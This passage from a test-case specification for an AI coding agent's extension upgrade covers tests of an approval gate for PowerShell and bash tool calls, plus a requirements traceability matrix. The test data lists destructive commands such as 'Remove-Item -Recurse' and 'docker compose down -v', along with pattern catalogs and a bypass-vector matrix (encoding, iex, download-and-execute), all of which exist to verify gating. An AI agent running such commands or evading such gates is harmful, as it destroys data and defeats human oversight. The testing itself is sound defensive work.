### TC-701: IT-02 — Approval gate mode-scoped: powershell security-policy parity vs bash behavior (TDD §7.2)

| Field | Value |
|-------|-------|
| **ID** | TC-701 (IT-14) |
| **Priority** | High |
| **Type** | Integration — Security |
| **Level** | IT — vitest + real gate |
| **Requirement** | FSD §10.2 IT-02; UC-003; BRD Story 4; TDD v1.2 §7.2 matrix (allowlist-of-safe for PS), §3.2 Powershell note (security-policy equivalence, NOT identical decisions) |
| **Preconditions** | Real gate + matcher + handler wired per v1.2; `getMode()` available for Supervised/Autopilot switching |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | `handler.requestApproval({ toolName: 'powershell', input: { command: 'Get-ChildItem' } })` in BOTH modes | `approved: true` — auto-approve both modes via `READONLY_PS_PATTERNS` positive match (TDD v1.2 §3.2 Step 1b, BR-10), NOT via name-set membership |
| 2 | `handler.requestApproval({ toolName: 'powershell', input: { command: 'Remove-Item -Recurse' } })` in BOTH modes | `approved: false` (pending → rejected) — require-approval both modes (`DESTRUCTIVE_PS_PATTERNS` Step 1, mode-independent, BR-11) |
| 3 | `handler.requestApproval({ toolName: 'bash', input: { command: 'Get-ChildItem' } })` under default Supervised (`getMode()` unwired) | **Pends via gate — NOT auto-approve** (non-destructive → content guard returns null → default supervised path; bash NOT allowlist-driven; TDD v1.3 §7.2) — decisions differ from powershell (NOT "identical to PS") |
| 4 | Same bash call with `getMode()` → `'autopilot'` | `approved: true` — auto-approve non-destructive (TDD v1.2 §7.2) |
| 5a | Repeat bash with a PowerShell-cmdlet "destructive" command (`Remove-Item -Recurse`) in both modes | Supervised → pend; Autopilot → auto-approve — unchanged (bash has no `Remove-Item` semantics; it matches no `DESTRUCTIVE_BASH_PATTERNS` entry) |
| 5b | Repeat bash with destructive **bash** command content (`docker compose down -v`) in both modes | BOTH modes → `require-approval` (pend) — `DESTRUCTIVE_BASH_PATTERNS` content guard, mode-independent, evaluated BEFORE the remembered-pattern and Autopilot branches (**SEC-06 CLOSED**, TDD v1.3 §3.2 Step 1a-bash) |
| 5c | Same call with a harmless docker command (`docker ps`, `docker run --rm nginx`) under Autopilot | `approved: true`, gate NOT called — no over-pend regression (`--rm` is not mis-classified as file deletion) |
| 6 | Verify Story 4 semantics | **Security-policy equivalence**, not identical decisions: non-safe powershell ALWAYS gated (allowlist-of-safe — Story 4/FSD UC-003 postcondition, NFR-SEC-01); bash keeps mode-dependent behavior for non-destructive commands but gates destructive content in BOTH modes — matrix per TDD v1.3 §7.2 |

**Test Data:** commands = `Get-ChildItem`, `Remove-Item -Recurse`, `docker compose down -v`, `docker ps`, `docker run --rm nginx`; tools = `powershell`, `bash`; modes = `supervised`, `autopilot`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-702: IT-03 — Stream protocol with PowerShell → UI renders

| Field | Value |
|-------|-------|
| **ID** | TC-702 (IT-15) |
| **Priority** | Medium |
| **Type** | Integration |
| **Level** | IT — vitest |
| **Requirement** | FSD §10.2 IT-03; UC-003; BR-12 |
| **Preconditions** | `StreamProtocolAdapter` + event mapper importable |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Agent calls powershell tool — produce a `PowerShellToolCallEvent` (real or fixture event) | Event produced |
| 2 | Pass through `mapAgentEvent` + `StreamProtocolAdapter.classifyTool("powershell")` | Classification = `'shell'`; mapped message payload well-formed |
| 3 | Verify UI-renderable payload | Message contains tool name `powershell` for display (`TOOL powershell`) |

**Test Data:** toolName = `powershell`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/tool-event-tracker.test.ts` + adapter test

---

### TC-703: Session host integration — ensureSessionHost with powershell loadout

| Field | Value |
|-------|-------|
| **ID** | TC-703 (IT-16) |
| **Priority** | High |
| **Type** | Integration |
| **Level** | IT — vitest + real SDK |
| **Requirement** | UC-003, BR-14; FSD §5.2; TDD §6.2; Error Code PI_SESSION_TIMEOUT |
| **Preconditions** | Real SDK 0.99.1; `ModelRuntime.create` resolvable or fixture model config |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `ensureSessionHost` with tools allowlist `['read', 'write', 'edit', 'powershell', 'grep', 'find', 'ls']` on win32 | Session host created with powershell in loadout |
| 2 | Verify no dual shell | Session tool list contains `powershell`, NOT `bash` |
| 3 | Timeout behavior (fixture: ensure > 30s) | `PI_SESSION_TIMEOUT` — fallback to legacy `PiWorkflowEngine` (TDD §13.1) |
| 4 | Session cache | Second call with same workspaceRoot reuses cached host (TDD §6.2 circuit breaker N/A — cached) |

**Test Data:** allowlist = `['read', 'write', 'edit', 'powershell', 'grep', 'find', 'ls']`
**Postconditions:** Session host cached
**File:** `extension/src/pi-workflow/__tests__/pi-agent-session-host.test.ts`

---

### TC-704: Event mapper — PowerShellToolCallEvent mapped correctly

| Field | Value |
|-------|-------|
| **ID** | TC-704 (IT-17) |
| **Priority** | Medium |
| **Type** | Integration |
| **Level** | IT — vitest |
| **Requirement** | FSD §5.1 (PowerShellToolCallEvent handling); TDD §2.2 (PiEventMapper VERIFY) |
| **Preconditions** | `pi-event-mapper.ts` importable with 0.99.1 event types |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Produce fixture `PowerShellToolCallEvent` (success + failure variants) with 0.99.1 event shape | Events constructed |
| 2 | Call `mapAgentEvent(event)` | Mapped without error — `ToolEventTracker` handles PowerShell events |
| 3 | Verify type guard coverage | `ToolName` union including `"powershell"` handled by all type guards (TDD §1.5) |

**Test Data:** fixture events: success variant + failure variant (exit ≠ 0)
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/tool-event-tracker.test.ts`

---

## 9. Regression Testing

### TC-800: Existing vitest suite passes after upgrade

| Field | Value |
|-------|-------|
| **ID** | TC-800 (E2E-API-12) |
| **Priority** | High |
| **Type** | Regression |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | FSD §10, TDD §12 step 36 (`npx vitest run` — 0 failures) |
| **Preconditions** | Upgrade + type fixes applied |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npm test` (vitest run) in extension/ | All existing tests pass — 0 failures |
| 2 | Run `npm run test:e2e` (vitest.e2e.config.ts) | E2E suite passes |

**Test Data:** None
**Postconditions:** Green build
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts` (or CI script)

---

### TC-801: Bash dialect guidance preserved on non-Windows

| Field | Value |
|-------|-------|
| **ID** | TC-801 (UT-33) |
| **Priority** | Medium |
| **Type** | Regression |
| **Level** | UT — vitest |
| **Requirement** | BRD §1.2 (non-Windows unchanged); FSD §3.4; existing BUG G tests |
| **Preconditions** | `withBashDialectHint`, `BASH_DIALECT_NOTE` still exported |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Verify `withBashDialectHint` still works | Wraps bash tool description with `POSIX Git Bash` note — preserved (existing test behavior unchanged) |
| 2 | Verify non-win32 prompt | `buildWorkspaceSystemPrompt` on linux still contains bash guidance (`Use forward slashes: ls not dir /b.`) |

**Test Data:** workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`; platform = `linux`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-802: Other tools unaffected — read/write/edit/grep/find/ls names unchanged

| Field | Value |
|-------|-------|
| **ID** | TC-802 (UT-34) |
| **Priority** | Medium |
| **Type** | Regression |
| **Level** | UT — vitest |
| **Requirement** | BRD §1.2; FSD §3.2.2 step 4 (core tools unchanged) |
| **Preconditions** | `mockPlatform('win32')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on win32; extract all tool names | Contains `read`, `write`, `edit`, `grep`, `find`, `ls` — all names unchanged from 0.80.10 |
| 2 | Compare against pre-upgrade tool list | Only shell tool changed (`bash` → `powershell`); all other tools identical |

**Test Data:** expected unchanged tools = `['read', 'write', 'edit', 'grep', 'find', 'ls']`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-803: Existing chat features still work in webview

| Field | Value |
|-------|-------|
| **ID** | TC-803 (E2E-UI-03) |
| **Priority** | Medium |
| **Type** | Regression |
| **Level** | E2E-UI — vitest webview harness / Playwright |
| **Requirement** | BRD §1.2; TDD §6.2 (PI_MODEL_UNRESOLVED fallback to legacy path — regression coverage) |
| **Preconditions** | Extension installed; chat panel open |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Send a simple chat message in the webview | Agent responds normally |
| 2 | Trigger a tool-using turn (e.g., read a file) | Tool events render as before |
| 3 | Model resolution | Model runtime resolves normally; `PI_MODEL_UNRESOLVED` fallback path intact if triggered |

**Test Data:** message = "Read extension/package.json and summarize dependencies"
**Postconditions:** Chat session stable
**File:** `extension/tests/e2e/webview-chat-regression.e2e.test.ts`

---

### TC-804: Workflow gate still gates write/edit/bash through real gate (mode-scoped)

| Field | Value |
|-------|-------|
| **ID** | TC-804 (IT-18) |
| **Priority** | Medium |
| **Type** | Regression — Security |
| **Level** | IT — vitest + real gate |
| **Requirement** | Existing gate behavior (pre-upgrade); FSD §3.3.3 BR-10/BR-11 unchanged for other tools; TDD v1.1 §7.2 (mode-scoped); BRD §1.2 |
| **Preconditions** | Real gate + handler wired; `getMode()` available for Supervised/Autopilot switching |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'write', input: {} })` under default Supervised | Goes through real gate (spy called) — still gated (pend) |
| 2 | Call with `edit` and `bash` (`input: { command: 'ls' }`) under default Supervised | Both still gated through real gate — approval policy unchanged for non-PowerShell tools under Supervised |
| 3 | Repeat all three with `getMode()` → `'autopilot'` | `write`, `edit`, `bash` all `auto-approve` — none in `DANGEROUS_TOOL_PATTERNS`, `requiresApproval(...) === false` (pre-upgrade Autopilot semantics UNCHANGED, TDD v1.1 §7.2) |

**Test Data:** tools = `write`, `edit`, `bash`; modes = `supervised` (default), `autopilot`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-805: Full project review UAT with PowerShell

| Field | Value |
|-------|-------|
| **ID** | TC-805 (SIT-03) |
| **Priority** | High |
| **Type** | Regression — UAT |
| **Level** | SIT — Manual |
| **Requirement** | TDD §12 Phase 7 step 40 (UAT); BRD Story 1-4 end-to-end |
| **Preconditions** | VSIX installed (extension v1.46.7); real workspace open in VS Code/Kiro |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run a full project review session with the upgraded agent (e.g., "Review the pi-workflow module for code standard violations") | Review completes end-to-end using PowerShell tool where shell needed |
| 2 | Verify PowerShell tool used naturally | Agent uses `powershell` tool; paths work as-is; no bash workarounds |
| 3 | Verify no crashes/errors across the session | Session completes without `PI_PWSH_UNAVAILABLE` fallback or crashes |
| 4 | Record UAT sign-off | UAT sign-off obtained (STP §2.6 exit criteria) |

**Test Data:** prompt = "Review the extension/src/pi-workflow module for code standard violations"
**Postconditions:** UAT sign-off recorded
**Evidence:** `evidence/TC-805-uat-session.png`

---

### TC-806: VSIX packaging succeeds

| Field | Value |
|-------|-------|
| **ID** | TC-806 (E2E-API-13) |
| **Priority** | Medium |
| **Type** | Regression |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | TDD §12 Phase 7 step 38 (`npm run package:prod`); BRD Step 10 |
| **Preconditions** | All tests pass (TC-800); version bumped to 1.46.7 |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Verify extension version in `package.json` | `1.46.7` |
| 2 | Run `npm run package:prod` in extension/ | VSIX created successfully |
| 3 | Verify VSIX artifact | `.vsix` file exists with expected size |

**Test Data:** version = `1.46.7`
**Postconditions:** VSIX artifact ready for install
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts` (or CI script)

---

### TC-807: Bash regression — Supervised mode pends bash calls (TDD §11.3 TC-15)

| Field | Value |
|-------|-------|
| **ID** | TC-807 (IT-19) |
| **Priority** | High |
| **Type** | Regression — Security (bash gate behavior) |
| **Level** | IT — vitest + real gate |
| **Requirement** | TDD v1.1 §11.3 TC-15; BRD §1.2 (bash behavior unchanged); TDD v1.1 §7.2 matrix; DISCREPANCY.md DISC-3/OPEN-2 |
| **Preconditions** | Real `ToolApprovalGate` + handler wired; default Supervised mode (`getMode()` unwired) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolUseId: 'tu-bash-sup', toolName: 'bash', input: { command: 'ls' } })` with default Supervised mode | `{ approved: false }` — pends via `ToolApprovalGate` (gate spy called; `onApprovalPending` surfaced) — UNCHANGED pre-upgrade behavior (BRD §1.2) |
| 2 | Verify NOT auto-approved despite non-destructive command | `bash` NOT in `READ_ONLY_TOOLS` → falls to default supervised path (TDD v1.1 §7.2) |
| 3 | Resolve the pending gate with `decision: 'approve'` | `{ approved: true }` — approval honored |

**Test Data:** toolName = `bash`; command = `ls`; toolUseId = `tu-bash-sup`; mode = supervised (default)
**Postconditions:** No pending approval entries after resolution
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-808: Bash regression — Autopilot auto-approves non-destructive bash (TDD §11.3 TC-16)

| Field | Value |
|-------|-------|
| **ID** | TC-808 (IT-20) |
| **Priority** | High |
| **Type** | Regression — Security (bash gate behavior) |
| **Level** | IT — vitest + real gate |
| **Requirement** | TDD v1.1 §11.3 TC-16; BRD §1.2 (bash behavior unchanged); TDD v1.1 §7.2 matrix; DISCREPANCY.md DISC-3/OPEN-2 |
| **Preconditions** | Real `ToolApprovalGate` + handler wired; `getMode()` → `'autopilot'` |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolUseId: 'tu-bash-ap', toolName: 'bash', input: { command: 'ls' } })` with `getMode()` → `'autopilot'` | `{ approved: true }` — auto-approve (non-destructive classification: `requiresApproval('bash') === false`); gate spy NOT called — UNCHANGED pre-upgrade behavior |
| 2 | Verify mechanism | Reaches Step 4 of the reconciled decision order (TDD v1.1 §3.2) — not via `READ_ONLY_TOOLS` (bash ∉ set) |

**Test Data:** toolName = `bash`; command = `ls`; toolUseId = `tu-bash-ap`; mode = autopilot
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

## 10. Requirements Traceability Matrix (RTM)

### 10.1 Use Cases (FSD §3.1.2, §3.2.2, §3.3.2)

| Requirement | Source | Test Cases | Coverage |
|-------------|--------|------------|----------|
| UC-001 — Dependency Upgrade | FSD §3.1.2 | TC-009, TC-010, TC-104, TC-105, TC-107, TC-200, TC-201, TC-202, TC-300, TC-301, TC-302, TC-303 | ✅ Covered |
| UC-002 — Native PowerShell Tool on Windows | FSD §3.2.2 | TC-001, TC-002, TC-003, TC-007, TC-100, TC-101, TC-102, TC-115, TC-203, TC-204, TC-205, TC-304, TC-305, TC-306, TC-307, TC-400, TC-401, TC-402, TC-409, TC-600, TC-601, TC-604, TC-700 | ✅ Covered |
| UC-003 — Workflow Gate & Classification Update | FSD §3.3.2 | TC-004, TC-005, TC-006, TC-008, TC-103, TC-106, TC-108, TC-110, TC-111, TC-112, TC-113, TC-114, TC-206, TC-207, TC-309, TC-310, TC-311, TC-312, TC-313, TC-314, TC-315, TC-403, TC-404, TC-405, TC-406, TC-407, TC-408, TC-410, TC-500, TC-501, TC-606, TC-608, TC-701, TC-702, TC-703, TC-704, TC-807, TC-808 | ✅ Covered |

### 10.2 Business Rules (FSD §3.1.3, §3.2.3, §3.3.3)

| Requirement | Source | Test Cases | Coverage |
|-------------|--------|------------|----------|
| BR-01 — All @earendil-works/* at same version 0.99.1 | FSD §3.1.3 | TC-300, TC-202 | ✅ |
| BR-02 — No `as any` shortcuts | FSD §3.1.3 | TC-301, TC-105 | ✅ |
| BR-03 — Semver compatible with Node engine | FSD §3.1.3 | TC-302, TC-107 | ✅ |
| BR-04 — Single resolved pi-agent-core (no duplicates) | FSD §3.1.3 | TC-303, TC-009, TC-104 | ✅ |
| BR-05 — win32 shell tool name = "powershell" | FSD §3.2.3 | TC-001, TC-304 | ✅ |
| BR-06 — non-win32 shell tool name = "bash" | FSD §3.2.3 | TC-002, TC-305, TC-314, TC-102 | ✅ |
| BR-07 — No shellPath passed to createPowerShellTool | FSD §3.2.3 | TC-306 | ✅ |
| BR-08 — powershellToolSystemPromptContribution used | FSD §3.2.3 | TC-007, TC-307 | ✅ |
| BR-09 — Git-Bash workaround retired for Windows | FSD §3.2.3 | TC-308, TC-409 | ✅ |
| BR-10 — Read-only powershell auto-approves (v1.2: via `READONLY_PS_PATTERNS` allowlist, SEC-02 — no longer `READ_ONLY_TOOLS` membership) | FSD §3.3.3; TDD v1.2 §3.2 Step 1b | TC-004, TC-309, TC-315 | ✅ |
| BR-11 — Destructive powershell commands gated (implemented via `DESTRUCTIVE_PS_PATTERNS`, checked FIRST — TDD v1.2 §7.3.2) | FSD §3.3.3 | TC-108, TC-110, TC-111, TC-112, TC-310, TC-405, TC-408, TC-410, TC-606, TC-501 | ✅ |
| BR-12 — classifyTool("powershell") = "shell" | FSD §3.3.3 | TC-005, TC-311, TC-106, TC-207, TC-702 | ✅ |
| BR-13 — buildFailureSteerCorrection shell-aware | FSD §3.3.3 | TC-006, TC-312, TC-407 | ✅ |
| BR-14 — Session tool loadout includes powershell on win32 | FSD §3.3.3 | TC-008, TC-313, TC-314, TC-703 | ✅ |

### 10.3 BRD Acceptance Criteria (BRD §2.3)

| Requirement | Source | Test Cases | Coverage |
|-------------|--------|------------|----------|
| Story 1 AC-1 — npm ls shows exactly one version 0.99.1 | BRD §2.3 Story 1 | TC-009, TC-303 | ✅ |
| Story 1 AC-2 — tsc --noEmit passes with 0 errors | BRD §2.3 Story 1 | TC-010, TC-603 | ✅ |
| Story 1 AC-3 — No duplicate pi-agent-core instances | BRD §2.3 Story 1 | TC-303, TC-009, TC-104 | ✅ |
| Story 2 AC-1 — win32 returns tool named "powershell" | BRD §2.3 Story 2 | TC-001, TC-304 | ✅ |
| Story 2 AC-2 — non-win32 returns tool named "bash" | BRD §2.3 Story 2 | TC-002, TC-305 | ✅ |
| Story 2 AC-3 — PowerShell toolSystemPromptContribution used | BRD §2.3 Story 2 | TC-007, TC-307 | ✅ |
| Story 2 AC-4 — Path commands execute with c:\ without translation errors | BRD §2.3 Story 2 | TC-003, TC-700, TC-409 | ✅ |
| Story 3 AC-1 — Auto-approves read-only powershell ops (v1.2: via allowlist) | BRD §2.3 Story 3 | TC-004, TC-309, TC-315 | ✅ |
| Story 3 AC-2 — Destructive PowerShell commands require approval | BRD §2.3 Story 3 | TC-108, TC-110, TC-310, TC-606, TC-501 | ✅ |
| Story 3 AC-3 — UI renders TOOL powershell correctly | BRD §2.3 Story 3 | TC-005, TC-500, TC-502, TC-503 | ✅ |
| Story 4 — Gates classify powershell securely (security-policy equivalence, NOT identical to bash; allowlist-of-safe per TDD v1.2) | BRD §2.2 Story 4 | TC-606, TC-701, TC-309, TC-315, TC-807, TC-808 | ✅ |

### 10.4 Non-Functional Requirements (FSD §8, §10.3)

| Requirement | Source | Test Cases | Coverage |
|-------------|--------|------------|----------|
| NFR — PowerShell tool init < 500ms | FSD §8, §10.3 | TC-600 | ✅ |
| NFR — Command execution < 2s | FSD §8, §10.3 | TC-601 | ✅ |
| NFR — Tool availability ≥ 99.9% | FSD §8.3 | TC-604 | ✅ |
| NFR — Fallback rate < 5% | FSD §8.3 | TC-605 | ✅ |
| NFR — Security: all non-safe PowerShell commands require approval (allowlist-of-safe; security-policy equivalence, NOT "same as bash"; TDD v1.2 §8.4) | FSD §8 Security | TC-606, TC-310, TC-108, TC-315, TC-410 | ✅ |
| NFR-SEC-01 — Gating guarantee: PS auto-approves IFF understandable + non-destructive + allowlisted; all else pends (both modes) | TDD v1.2 §8.4 | TC-004, TC-315, TC-404, TC-410, TC-606 | ✅ |
| NFR-SEC-02 — No over-approval: only over-pend residual; no fail-open PS path | TDD v1.2 §8.4 | TC-103, TC-315, TC-408, TC-410 | ✅ |
| NFR-SEC-03 — Ordering invariant: destructive PS never `{approved:true}` via read-only path | TDD v1.2 §8.4 | TC-112, TC-108 | ✅ |
| NFR-SEC-04 — Auditability: every PS/bash decision logs matched pattern/category + mode + hash/length | TDD v1.2 §8.4 | TC-608, TC-607 | ✅ |
| NFR — Node engine compatibility | FSD §8 Compatibility | TC-302, TC-107 | ✅ |
| NFR — TypeScript compilation 0 errors | FSD §8 Compatibility | TC-010, TC-603 | ✅ |
| NFR — No duplicate peers | FSD §8 Compatibility | TC-303, TC-009 | ✅ |
| NFR — Usability: webview renders TOOL powershell | FSD §8 Usability | TC-500, TC-502 | ✅ |
| NFR — npm install < 120s | FSD §10.3 | TC-602 | ✅ |
| NFR — tsc < 60s | FSD §10.3 | TC-603 | ✅ |

### 10.5 Error Codes (TDD §13.1)

| Requirement | Source | Test Cases | Coverage |
|-------------|--------|------------|----------|
| PI_PWSH_UNAVAILABLE — PowerShell tool creation failed | TDD §13.1 | TC-203, TC-101 | ✅ |
| PI_PWSH_NOT_FOUND — pwsh.exe not found | TDD §13.1 | TC-100 | ✅ |
| PI_SESSION_TIMEOUT — Session creation timeout | TDD §13.1 | TC-703 | ✅ |
| PI_MODEL_UNRESOLVED — Model not found fallback | TDD §13.1 | TC-803 | ✅ |
| PI_TSC_ERROR — TypeScript compilation error | TDD §13.1 | TC-201, TC-010 | ✅ |
| PI_DUPLICATE_DEP — Duplicate dependency | TDD §13.1 | TC-202, TC-104, TC-303 | ✅ |

### 10.6 FSD §10 Test Scenarios Mapping

| FSD Scenario | Source | STC Test Cases |
|--------------|--------|----------------|
| FSD TC-01 → TC-15 (Functional) | FSD §10.1 | TC-001, TC-002, TC-203/TC-101, TC-004/TC-309, TC-310/TC-108, TC-005, TC-006, TC-006/TC-801, TC-008, TC-305/TC-314, TC-009/TC-303, TC-010, TC-200, TC-301, TC-308 |
| FSD IT-01 → IT-04 (Integration) | FSD §10.2 | TC-700, TC-701, TC-702, TC-800 + TC-806 + TC-805 |
| FSD Performance targets (§10.3) | FSD §10.3 | TC-600, TC-601, TC-602, TC-603 |

### 10.7 Security Review Findings (SECURITY-REVIEW.md v1.0)

| Finding | Severity | Description | Test Cases | Coverage |
|---------|----------|-------------|------------|----------|
| SEC-01 | High | Destructive-pattern catalog coverage (all categories) | TC-110, TC-310 | ✅ |
| SEC-02 | High | Allowlist-of-safe posture (no fail-open; TC-404 flip) | TC-004, TC-103, TC-315, TC-404, TC-410 | ✅ |
| SEC-03 | High | Bypass-resistance (encode/iex/call-op/escape/concat/cmd/download+exec) + normalization | TC-111, TC-410 | ✅ |
| SEC-04 | Medium | Ordering invariant — destructive never auto-approved via read-only path | TC-112 | ✅ |
| SEC-05 | Medium | Audit log — matched pattern/category + mode + hash/length + `NO_SAFE_MATCH_PENDED` | TC-608 | ✅ |
| SEC-06 | Medium | Bash under Autopilot destructive exposure — **CLOSED** by `DESTRUCTIVE_BASH_PATTERNS` content guard (SA4E-335 follow-up) | TC-606 step 3, TC-701 step 5b/5c | ✅ |
| SEC-07 | High | Dependency supply-chain gate (npm audit, pins, single-version, capability) | TC-609 | ✅ |
| SEC-08 | Medium | Malformed/renamed input field → fail-secure pend | TC-113, TC-406 | ✅ |
| SEC-09 | Low | Unwired `getMode()` → Supervised (regression) | TC-114 | ✅ |
| SEC-10 | Low | Fallback-to-bash degrades content gate (logged) | TC-115 | ✅ |

**Coverage Summary:**

| Category | Total | Covered | Coverage % |
|----------|-------|---------|------------|
| Use Cases | 3 | 3 | 100% |
| Business Rules | 14 | 14 | 100% |
| Acceptance Criteria | 11 | 11 | 100% |
| Non-Functional Requirements | 15 | 15 | 100% |
| Error Codes | 6 | 6 | 100% |
| Security Review Findings (SEC-01..SEC-10) | 10 | 10 | 100% |
| **Overall** | **59** | **59** | **100%** |

---

## 11. Appendix

### 11.1 Test Data Setup Scripts

Test data CSV files at `documents/SA4E-336/testdata/`:

| File | Covers Test Cases | Description |
|------|-------------------|-------------|
| `pre-seeded-data.csv` | Baseline | Workspace paths, package versions, tool name expectations |
| `dependency-upgrade-testdata.csv` | TC-009, TC-010, TC-104, TC-105, TC-107, TC-200, TC-201, TC-202, TC-300, TC-301, TC-302, TC-303, TC-602, TC-603, TC-800, TC-806 | Package names, versions, build commands |
| `powershell-tool-testdata.csv` | TC-001, TC-002, TC-003, TC-100, TC-101, TC-102, TC-203, TC-204, TC-205, TC-304, TC-305, TC-306, TC-307, TC-308, TC-400, TC-401, TC-402, TC-409, TC-600, TC-601, TC-604, TC-605, TC-700 | PowerShell commands (read-only/destructive), platform variants, boundary paths |
| `workflow-gate-testdata.csv` | TC-004, TC-005, TC-103, TC-106, TC-108, TC-206, TC-207, TC-309, TC-310, TC-311, TC-312, TC-315, TC-403, TC-404, TC-405, TC-406, TC-407, TC-408, TC-410, TC-606, TC-701, TC-702, TC-804, TC-807, TC-808 | Tool names, commands, modes (supervised/autopilot), expected decisions (TDD v1.2 §7.2 allowlist-of-safe matrix) |
| `destructive-catalog-testdata.csv` | TC-110, TC-310 | SEC-01 destructive-pattern coverage matrix — one row per sample, `category` column (file-delete, overwrite, process/service, format/disk, policy/security, accounts, scheduled, git-destructive) |
| `bypass-vectors-testdata.csv` | TC-111, TC-410 | SEC-03 bypass-resistance matrix — encode/iex/call-op/escape/concat/cmd/download+exec, `decoded_expected` column |
| `allowlist-safe-testdata.csv` | TC-004, TC-315 | SEC-02 safe-allowlist commands (`READONLY_PS_PATTERNS` matches) + smuggle/non-allowlist negatives |
| `malformed-input-testdata.csv` | TC-113, TC-406 | SEC-08 malformed/renamed/missing `command` input shapes → fail-secure pend |
| `session-loadout-testdata.csv` | TC-008, TC-313, TC-314, TC-703, TC-704 | Expected tool allowlists per platform |
| `system-prompt-testdata.csv` | TC-007, TC-307, TC-801 | Expected dialect fragments per platform |
| `ui-ux-testdata.csv` | TC-500, TC-501, TC-502, TC-503, TC-803 | Webview scenarios, chat prompts |
| `nfr-testdata.csv` | TC-600, TC-601, TC-602, TC-603, TC-604, TC-605, TC-606, TC-607, TC-608, TC-609 | Performance targets, sample counts, security-gate matrix, audit-log + supply-chain gate |
| `regression-testdata.csv` | TC-800, TC-801, TC-802, TC-803, TC-804, TC-805, TC-806 | Regression scenario data |

**Setup commands (PowerShell):**

```powershell
# Baseline: verify Node + npm
node --version                     # expect v22.x
npm --version                      # expect 10.x

# Dependency bump (before TC-009/TC-010)
cd extension
npm install                        # installs @earendil-works/*@0.99.1
npm ls @earendil-works/pi-agent-core   # single 0.99.1

# Type audit (TC-010)
npx tsc --noEmit -p extension/tsconfig.json

# Full test run (TC-800)
npm test
npm run test:e2e

# Packaging (TC-806)
npm run package:prod
```

### 11.2 Environment Configuration

| Setting | Value |
|---------|-------|
| Platform | win32 (Windows 10/11) |
| Node | 22.x |
| Extension version under test | 1.46.7 |
| pi-coding-agent | 0.99.1 |
| Workspace root for tests | `C:\projects\kiro\SDLC-Agents-4-Enterprise` |
| Scratch path for destructive tests | `C:\Users\ASUS\AppData\Local\Temp\opencode\sa4e336-scratch\` (never the real repo) |
| Platform mock helper | `extension/src/pi-workflow/__tests__/helpers/platform-mock.ts` (`mockPlatform('win32' | 'linux' | 'darwin')` — TDD §11.4) |

### 11.3 Diagram Index

| # | Diagram | Source File (.drawio) |
|---|---------|----------------------|
| 1 | Test Coverage Overview | documents/SA4E-336/diagrams/test-coverage.drawio |
| 2 | Test Execution Flow | documents/SA4E-336/diagrams/test-execution-flow.drawio |
| 3 | Use Case Diagram (existing) | documents/SA4E-336/diagrams/use-case.drawio |
| 4 | Business Flow (existing) | documents/SA4E-336/diagrams/business-flow.drawio |
| 5 | Architecture (existing, TDD) | documents/SA4E-336/diagrams/architecture.drawio |
| 6 | Component Diagram (existing, TDD) | documents/SA4E-336/diagrams/component.drawio |
| 7 | Class Diagram (existing, TDD) | documents/SA4E-336/diagrams/class-diagram.drawio |
| 8 | Sequence — PowerShell creation (existing, TDD) | documents/SA4E-336/diagrams/sequence-upgrade.drawio |
| 9 | Sequence — Gates (existing, TDD) | documents/SA4E-336/diagrams/sequence-gates.drawio |

---

*STC v1.2 — QA Agent. All 88 test cases traceable to BRD/FSD/TDD v1.2 + SECURITY-REVIEW.md requirements (allowlist-of-safe posture, SEC-01..SEC-10 folded in). RTM coverage 100% (59/59 requirements incl. 4 NFR-SEC + 10 SEC findings).*
